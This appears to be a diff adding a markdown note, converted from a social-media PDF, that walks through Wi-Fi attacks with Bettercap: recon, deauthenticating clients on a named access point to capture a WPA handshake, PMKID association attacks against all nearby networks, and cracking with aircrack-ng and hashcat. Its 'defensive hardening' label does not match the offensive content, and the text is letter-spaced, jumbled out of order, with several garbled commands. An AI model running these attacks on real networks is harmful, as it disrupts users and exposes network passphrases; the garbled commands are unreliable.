@@ -1,0 +1,184 @@
+---
+title: "Wireless Penetration Testing Bettercap"
+description: "A defensive hardening, auditing, and threat detection reference guide for Wireless Penetration Testing Bettercap."
+date: "2026-05-28"
+tags: ["wireless", "hardening", "auditing", "compliance"]
+category: "notes"
+subcategory: "security"
+difficulty: "Intermediate"
+readingTime: "24 min read"
+---
+
+# Wireless Penetration Testing Bettercap
+
+> [!IMPORTANT]
+> **Defensive & Authorized Auditing Purposes Only**
+> This note is prepared for educational and authorized defensive diagnostics, infrastructure auditing, and host hardening purposes only. Unauthorised access, penetration tests without written consent, or execution of security commands on external networks is illegal.
+
+ 
+T a b l e  o f  C o n t e n t
+1 .  I n s t a l l a t i o n  
+2 .  M o n i t o r  m o d e  a n d  d i s c o v e r y  
+3 .  S o r t i n g  f i l t e r s  
+4 .  D e a u t h  a t t a c k  u s i n g  b e t t e r c a p  
+5 .  P M K I D  a t t a c k  u s i n g  b e t t e r c a p
+h e x s e c t e a m
+h e x s e c _ t o o l s
+h e x s e c t e a m
+A f t e r  i n s t a l l a t i o n ,  y o u  c a n  e a s i l y  a c c e s s  t h e  m a i n  m e n u  b y  t y p i n g  i n :
+1.  bettercap
+2 / 1 3 / 2 6 ,  1 1 : 0 7  P M
+2 / 1 3
+N o w  t o  n a v i g a t e  y o u r  w a y  a r o u n d  t h i s  t o o l  f o r  a l l  t h e  W i - F i  t e s t i n g  r e l a t e d  o p t i o n s ,  t h e  h e l p
+p a g e  i s  a v a i l a b l e  a t
+1.  help wifi
+3 / 1 3
+N o w ,  T h i s  t o o l  r e q u i r e s  a n  o l d e r  v e r s i o n  o f  t h e  p c a p  l i b r a r y  s o ,  w e ’ l l  f i r s t  d o w n l o a d  t h a t  u s i n g
+w g e t  .
+1.
+2.
+wget http: //old.kali.org/kali/pool/main/libp/libpcap/libpcap0.8_1.9.1-4_amd64.deb
+dpkg -i libpcap0. 8_1 . 9 . 1 -4_amd64. deb
+4 / 1 3
+S o r t i n g  f i l t e r s
+O f t e n  t i m e s  k n o w i n g  t h e  v e n d o r  o f  a n  a c c e s s  p o i n t  a i d s  u s  i n  c h e c k i n g  a c c e s s  p o i n t  a g a i n s t
+k n o w n  v u l n e r a b i l i t i e s .  T o  d o  t h i s  w e  c a n  u s e  t h e  f o l l o w i n g  c o m m a n d :
+M o n i t o r  M o d e  a n d  W i - F i  d i s c o v e r y
+M o n i t o r  m o d e  i s  a  p r o m i s c u o u s  m o d e  f o r  y o u r  I E E E 8 0 2 . 1 1 x  r e c e i v e r  ( a k a  W i - F i  a d a p t e r  o r
+W i - F i  N I C )  a n d  l e t s  y o u  c a p t u r e  s i g n a l s  f r o m  n o t  o n l y  y o u r  a c c e s s  p o i n t  b u t  o t h e r s  a s  w e l l .  T o
+p u t  y o u r  W i - F i  a d a p t e r  i n  p r o m i s c u o u s  m o d e :
+T o  s t a r t  d i s c o v e r i n g  A c c e s s  P o i n t s  a r o u n d  y o u :
+1.
+1.  wifi. recon  on
+ bettercap -iface wlan0mon
+5 / 1 3
+A s  y o u  c a n  s e e  w e  a r e  n o w  a b l e  t o  s e e  a  m a j o r i t y  o f  t h e  m a n u f a c t u r e r s  o f  a c c e s s  p o i n t s
+a r o u n d  m e .  N o w ,  w h a t  i f  I  w a n t  t o  s e e  t h e  a c c e s s  p o i n t s  i n  d e s c e n d i n g  o r d e r  o f  t h e  c l i e n t s
+c o n n e c t e d  t o  i t .  A s  w e  a l r e a d y  k n o w  t h a t  d e a u t h  a t t a c k s  w o r k  o n  A P s  w i t h  c l i e n t s  t o  c a p t u r e
+a  h a n d s h a k e  a n d  h e n c e ,  h a v i n g  m o r e  c l i e n t s  c a t a l y s e s  t h e  c a p t u r e  p r o c e s s .  S o ,  f o r  t h a t  w e
+h a v e :
+1.
+2.
+1.
+2.
+set wifi. show . manufacturer
+wifi. show
+set. wifi . show . sort  clients desc
+wifi. show
+true
+6 / 1 3
+A d d i t i o n a l l y ,  y o u  c a n  n o w  s e e  h i d d e n  S S I D s  p o p p i n g  u p .  T h e  a n g u l a r  b r a c k e t  i s  c o n s i d e r e d
+b e f o r e  A - Z  b e c a u s e  i t  i s  a  s p e c i a l  s y m b o l .
+N o w ,  w h a t  i f  w e  w a n t  t o  l i m i t  t h e  r e s u l t s  t o  o n l y ,  l e t ’ s  s a y ,  t h e  t o p  3 ?  T o  d o  t h i s :
+A s  y o u  c a n  s e e  t h e  A P s  h a v e  a r r a n g e d  t h e m s e l v e s  i n  d e s c e n d i n g  o r d e r  o f  a  n u m b e r  o f  c l i e n t s
+c o n n e c t e d .
+L e t ’ s  d o  t h e  s a m e  w i t h  E S S I D  t o o  a n d  a r r a n g e  i t  i n  a s c e n d i n g  o r d e r .
+1.
+2.
+1.
+2.
+set wifi. show . limit  3
+wifi. show
+set. wifi . show . sort  essid asc
+wifi. show
+7 / 1 3
+N o w ,  w e ’ l l  f i r s t  p u t  u p  t h e  l i s t  o f  A P s  f o u n d :
+I n  t h i s  c a s e ,  w e  c a n  o b s e r v e  t h a t  c l i e n t s  f r o m  2  A P s  h a v e  b e e n  d e a u t h e n t i c a t e d .
+D e a u t h  a t t a c k s  u s i n g  B e t t e r c a p
+W e  h a v e  a l r e a d y  s e e n  h o w  t o  r e c o n ,  s o r t  a n d  f i l t e r .  L e t ’ s  c o n d u c t  a  s h o r t  d e a u t h  a t t a c k  o n  a n
+a c c e s s  p o i n t .
+F i r s t ,  p u t  y o u r  w i f i  a d a p t e r  i n  m o n i t o r  m o d e
+T h e r e f o r e ,  w e ’ v e  l i m i t e d  t h e  r e s u l t s  t o  o n l y  t h e  t o p  3 .  N e x t ,  l e t ’ s  s e n d  d e a u t h e n t i c a t i o n
+p a c k e t s  t o  o p e n  n e t w o r k s .  O p e n  n e t w o r k s  a r e  t h o s e  w h i c h  a r e n ’ t  p r o t e c t e d  b y  a  p a s s p h r a s e .
+1.
+1.
+2.
+events. stream  off
+wifi. show
+ set wifi. deauth . open  true
+8 / 1 3
+N o t e  t h a t  e v e n t s . s t r e a m  i s  a  l o g g i n g  f e a t u r e  i n  B e t t e r c a p  t h a t  s h o w s  l o g s ,  n e w  h o s t s  b e i n g
+f o u n d ,  e t c .  B y  d e f a u l t ,  i t  i s  e n a b l e d ,  b u t  t o  p r o v i d e  a  c l e a r  o u t p u t ,  w e  c a n  t u r n  i t  o f f .
+N o w ,  w e ’ l l  a t t a c k  o n  A P  “ r a a j . ”
+A s  y o u  c a n  s e e ,  t h e  c l i e n t  h a s  r e a u t h e n t i c a t e d  a f t e r  b e i n g  d e a u t h e n t i c a t e d  b y  b e t t e r c a p  a n d
+a  h a n d s h a k e  h a s  b e e n  c a p t u r e d
+N o w ,  w e ’ l l  u s e  a i r c r a c k - n g  t o  c r a c k  h a s h e s  c a p t u r e d  i n  t h i s  h a n d s h a k e  f i l e .  W e ’ v e  a l r e a d y
+w r i t t e n  a n  a r t i c l e  o n  a i r c r a c k - n g  f o r  y o u r  r e f e r e n c e  h e r e .
+I t  i s  o p e r a t i n g  o n  c h a n n e l  5  a n d  w e ’ d  f i r s t  p u t  o u r  a d a p t e r  t o  l i s t e n  o n  c h a n n e l  5 .
+B y  s e t t i n g  s n i f f . v e r b o s e  t o  t r u e ,  e v e r y  c a p t u r e d  a n d  p a r s e d  p a c k e t  w i l l  b e  s e n t  t o  t h e
+e v e n t s . s t r e a m  f o r  d i s p l a y i n g .
+N e x t ,  t h e  n e t . s n i f f . f i l t e r  e t h e r  p r o t o  0 * 8 8 8 e  s e t s  t h e  s n i f f e r  t o  c a p t u r e  E A P O L  f r a m e s .  0 * 8 8 8 e
+i s  t h e  s t a n d a r d  c o d e  f o r  E A P O L  ( I E E E  8 0 2 . 1 1 X  f r a m e s ) .
+O u t p u t  f i l e  i s  s e t  t o  w i f i . p c a p
+n e t . s n i f f  o n  t u r n s  t h e  b e t t e r c a p  s n i f f e r  o n
+w i f i . d e a u t h  s t a r t s  s e n d i n g  d e a u t h  p a c k e t s  t o  t h e  s p e c i f i e d  M A C  I D  ( B S S I D )  o f  t h e  a c c e s s
+p o i n t
+e v e n t s . s t r e a m  o n  t u r n s  t h e  l o g g i n g  o n  a n d  n o w  b e t t e r c a p  w i l l  r u n  i n  v e r b o s e  m o d e .
+1.
+2.
+3.
+4.
+5.
+6.
+7.
+set wifi. recon . channel  5
+set net. sniff . verbose  true
+set net. sniff . filter  ether proto 0 *888e
+set net. sniff . output  wifi. pcap
+set net. sniff  on
+wifi. deauth  18 : 45 : 93 : 69 :a5: 19
+events. stream  on
+9 / 1 3
+A n d  j u s t  l i k e  t h a t ,  w e  h a v e  c r a c k e d  t h e  W i - F i  p a s s p h r a s e  o f  “ r a a j . ”
+P M K I D  A t t a c k  u s i n g  B e t t e r c a p
+W e ’ v e  d i s c u s s e d  i n  d e t a i l  P M K I D  a n d  P M K I D  a t t a c k s  i n  t h i s  a r t i c l e  h e r e .  N o w ,  l e t ’ s  s e e  a  s m a l l
+t u t o r i a l  w h e r e  a  b e t t e r c a p  c a n  b e  u s e d  t o  c o n d u c t  P M K I D  a t t a c k s .
+H e r e ,  d i c t . t x t  i s  a  l o n g  p a s s w o r d  f i l e  c o n t a i n i n g  t h e  m o s t  c o m m o n l y  u s e d  p a s s w o r d s  a n d
+p a s s w o r d s  I  g e n e r a t e d  g i v e n  t h e  k n o w l e d g e  I  h a v e  a b o u t  m y  t a r g e t .
+1.
+1.
+2.
+3.
+bettercap
+set wifi. interface  wlan0mon
+wifi. recon  on
+ aircrack-ng bettercap-wifi-handshakes. pcap  -w /root/dict. txt
+1 0 / 1 3
+L e t ’ s  s e e  t h e  t a r g e t  A P s  a v a i l a b l e
+F o r  t h e  P M K I D  a t t a c k  t o  w o r k  w e  h a v e  t o  s e n d  a n  a s s o c i a t i o n  r e q u e s t  t o  t h e  t a r g e t  A c c e s s
+P o i n t .  W e  d o  t h i s  w i t h :
+1.
+1.
+ wifi. show
+ wifi. assoc  < BSSID &gt;
+1 1 / 1 3
+H e r e ,  1 6 8 0 0  i s  t h e  c o d e  f o r  P M K I D  W P A / W P A 2  h a s h  t y p e .  We  h a v e  u s e d  t h e  r o c k y o u
+d i c t i o n a r y  h e r e .
+A s  w e  c a n  s e e ,  w e  h a v e  s u c c e s s f u l l y  r e c e i v e d  t h e  R S N  f r a m e  c o n t a i n i n g  P M K I D  a n d  i t  h a s
+b e e n  s a v e d  i n  a  p c a p  f o r m a t .  W h a t  i s  I  w a n t  t o  s e n d  a n  a s s o c i a t i o n  r e q u e s t  t o  a l l  t h e  Wi - F i s
+a v a i l a b l e .  T o  d o  t h a t  t h e  c o m m a n d  i s :
+A n d  y e s ,  a l l  t h e  v u l n e r a b l e  r o u t e r s  r e t u r n e d  t h e  R S N  f r a m e  c o n t a i n i n g  P M K I D  a n d  i t  g o t  s a v e d
+i n  a  p c a p  f i l e .
+N o w  w e  c a n  u s e  t h e  h c x p c a p t o o l  t o  c o n v e r t  t h i s  p c a p  f i l e  i n  H a s h c a t  c r a c k a b l e  f o r m a t  a n d
+u s e  H a s h c a t  t o  c r a c k  t h e  P M K  h a s h .
+1.
+1.
+2.
+ wifi. assoc  all
+hcxpcaptool -z hashpmkid bettercap-wifi-handshakes. pcap
+hashcat -m 16800  --force hashpmkid /usr/share/wordlists/rockyou. txt  --show
+1 2 / 1 3
+A n d  i t ’ s  s o  s i m p l e .  B e t t e r c a p  i s  a  s n i f f e r  w i t h  m a n y  o t h e r  s u c h  f u n c t i o n a l i t i e s  b e s i d e s  Wi - F i
+p a c k e t  s n i f f i n g .  W e  h o p e  t h a t  t h i s  a r t i c l e  h e l p e d  y o u  i n  d e v e l o p i n g  o p i n i o n s  a b o u t  t o o l s
+a v a i l a b l e  i n  t h e  m a r k e t  t o d a y  a n d  f o r g i n g  y o u r  o w n  W i - F i  s e c u r i t y  a u d i t  t o o l k i t .  T h a n k s  f o r
+r e a d i n g .  H a v e  a  n i c e  d a y .
+1 3 / 1 3
+📚 🔐  E d u c a t i o n a l  p u r p o s e s  o n l y  —  e t h i c a l  l e a r n i n g  &  r e s p o n s i b l e
+u s e .
+📂  F u l l  t o o l  l i s t  &  P D F  a v a i l a b l e
+ 👉  C o m m e n t  “ I N T E R E S T E D ”  a n d  I ’ l l  s e n d  i t  t o  y o u
+ S a v e  •  S h a r e  •  F o l l o w
+F O L L O W  F O R  M O R E  H A C K I N G  &  A I  S E C U R I T Y
+C O N T E N T
+ D a i l y  t o o l s  •  T u t o r i a l s  •  O f f e n s i v e  A I  •  C y b e r
+S e c u r i t y
